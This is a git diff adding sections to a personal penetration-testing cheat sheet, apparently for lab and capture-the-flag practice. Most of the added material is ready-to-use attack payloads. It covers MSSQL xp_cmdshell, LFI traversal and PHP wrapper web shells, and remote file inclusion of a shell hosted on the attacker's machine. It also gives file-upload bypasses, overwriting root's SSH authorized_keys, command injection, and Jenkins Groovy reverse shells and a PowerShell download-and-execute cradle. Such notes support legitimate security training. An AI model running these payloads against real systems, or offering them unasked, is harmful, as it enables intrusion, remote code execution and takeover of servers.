@@ -9,6 +9,7 @@
   - [Linux Boxes](#linux-boxes)
 - [SQL](#sql)
   - [MySQL](#mysql)
+  - [Mssql](#mssql)
   - [sqlite](#salite)
   - [SQLi](#sqli)
  
@@ -78,6 +79,8 @@
   - [Directory Traversal](#directory-traversal)
   - [Local File Inclusion](#local-file-inclusion)
   - [PHP File Upload Bypass](#php-file-upload-bypass)
+  - [File Upload Exploit](#file_upload_exploit)
+  - [Command Injection](#command_injection)
 - [NFS](#nfs)
 - [SMB](#smb)
 - [FTP](#ftp)
@@ -374,6 +377,8 @@ show databases;
 use user;
 show tables;
 select * from users_secure;
+select version();
+select system_user();   # current db user 
 
 # Add a new row
 INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
@@ -519,6 +524,30 @@ SELECT POW(1,1)	When we only have numeric output	1	Error with other DBMS
 SELECT SLEEP(5)	Blind/No Output	Delays page response for 5 seconds and returns 0.	Will not delay response with other DBMS
 ```
 
+## MSSQL
+```bash
+python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
+select name from sys.databases
+
+# db version
+SELECT @@version;
+
+# existing tables
+SELECT * FROM offsec.information_schema.tables;
+
+# select table
+select * from offsec.dbo.users;
+
+# try xp_cmdshell
+> xp_cmdshell whoami
+> enable_xp_cmdshell
+
+# try xp_dirtree
+> xp_dirtree c:\
+> xp_dirtree c:\inetpub\wwwroot
+> 
+```
+
 ## sqlite
 ```bash
 sqlitebrowser ma.db
@@ -655,20 +684,7 @@ whatweb -a3 https://www.facebook.com -v
 sudo ntpdate 10.10.x.x
 ```
 
-### MSSQL
-```bash
-python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
-select name from sys.databases
 
-# try xp_cmdshell
-> xp_cmdshell whoami
-> enable_xp_cmdshell
-
-# try xp_dirtree
-> xp_dirtree c:\
-> xp_dirtree c:\inetpub\wwwroot
-> 
-```
 
 ### certipy (https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
 ```bash
@@ -1655,21 +1671,30 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 ### Filename Prefix
 ```bash
 include("lang_" . $_GET['language']);
+
+# We may be able to bypass filename prefix using / at the beginning
+index.php?language=/../../../etc/passwd
+
 ```
-- index.php?language=/../../../etc/passwd
 
 ### Second-Order Attacks
 When a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png).
 - we craft a malicious LFI username (e.g. ../../../etc/passwd)
 
 ### Non-Recursive Path Traversal Filters
-- ....//
-- ..././
-- ....\/
-- ?language=languages/....//....//....//....//flag.txt
+```bash
+....//
+..././
+....\/
+?language=languages/....//....//....//....//flag.txt
+
+```
+
 
 ### Bypass with URL Encoding
-- ?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+```bash
+?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+```
 
 ### Approved Paths
 we can fuzz web directories under the same path, and try different ones until we get a match
@@ -1685,11 +1710,12 @@ we can fuzz web directories under the same path, and try different ones until we
 - If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)
 
 ### Bypass Appended Extension
-- null byte
+- null byte(%00)
 - truncate
 
-### Source Code Disclosure(WE NEED TO FUZZ)
+### PHP Filters
 ```bash
+# Source Code Disclosure(WE NEED TO FUZZ)
 mightyllama@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
 
 index.php?language=php://filter/read=convert.base64-encode/resource=config
@@ -1702,19 +1728,40 @@ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
 
 ### Data Wrapper
 ```bash
+# first check if we can by checking php config file
+## for apache
+/etc/php/X.Y/apache2/php.ini
+## for nginx
+/etc/php/X.Y/fpm/php.ini
+
+# Use curl to get config file
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+
+# check if allow_url_include is on
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+# encode php code
 echo '<?php system($_GET["cmd"]); ?>' | base64
-URL ENCODED!
+# urlencode the encoded code
 index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 ```
 
 ### Input Wrapper
 ```bash
-curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
-            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# Need to check "allow_url_include" is on just like data wrapper
+
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
+
+# if the function only accepts POST
+curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
+
 ```
 
 ### Expect Wrapper
 ```bash
+# check if we can exploit expect wrapper by investigating php config file
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 ```
 
@@ -1722,8 +1769,19 @@ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 
 ## Remote File Inclusion
 ```bash
+# first start by trying to include a local URL
+/index.php?language=http://127.0.0.1:80/index.php
+
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+
+# FTP protocol
+sudo python -m pyftpdlib -p 21
+index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+
+# SMB protocol
+impacket-smbserver -smb2support share $(pwd)
+index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 ```
 
 ======================= log poisoning =============================================
@@ -1821,8 +1879,18 @@ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.t
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u http://192.168.190.53:8080/site/index.php?page=FUZZ -fl 5
 ```
 
-## PHP File Upload Bypass
+## File Upload Exploit
+
+### Upload the same file twice to see what happens
+If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server.
+If the web application displays an error message, this can reveal programming language or web technologies in use.
+
+### Executable Files
 ```bash
+# Bypass .php filter
+.phps, .php7, .phtml, .pHP, .PHP, .PHp,...
+
+# See if we can upload .htaccess file
 echo "AddType application/x-httpd-php .xxx" > htaccess
 ```
 
@@ -1855,6 +1923,32 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 
 # execute
 index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+
+### Non-Executable Files
+```bash
+# Change filename to overwrite authorized_keys file
+## generate ssh key and write a file that has its public key
+ssh-keygen
+fileup
+cat fileup.pub > authorized_keys
+
+## overwrite authorized_keys file
+../../../../../../../root/.ssh/authorized_keys
+
+## check if we can login
+rm ~/.ssh/known_hosts
+ssh -p 2222 -i fileup root@mountaindesserts.com
+
+```
+
+## Command Injection
+```bash
+# ; to add another command
+git%3Bipconfig
+
+# &&
+
 ```
 
 
@@ -2087,10 +2181,41 @@ ls -R
 
 # Jenkins
 ```bash
+# On linux, let's run id
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+
+# On linux, gain reverse shell
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+# On Windows using powershell script
+cmd = """powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.x.x/rev.ps1')"""
+println cmd.execute().text
+
+
+# On windows using java reverse shell
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+# Miscellaneous Vulnerabilities
+Several remote code execution vulnerabilities exist in various versions of Jenkins. One recent exploit combines two vulnerabilities, CVE-2018-1999002 and CVE-2019-1003000 to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins version 2.137.
+
+Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.
+```
+
+# Wordpress
+```bash
 
 
 ```
-
 
 # Active Directory
 ## Enumeration
